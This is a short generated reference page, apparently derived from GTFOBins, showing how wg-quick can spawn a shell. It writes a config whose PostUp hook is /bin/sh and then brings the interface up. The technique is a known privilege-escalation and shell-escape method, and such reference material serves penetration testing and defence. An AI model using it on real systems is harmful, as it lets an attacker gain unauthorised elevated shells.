---
parsed_by: focuslocust
source: commands
type: generated
---
# wg-quick Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## wg-quick

Tool page: [wg-quick](../../tools/linux/wg-quick.md)

### shell

```text
cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wg-quick` |
| Evidence | Function example preserved from source parser. |
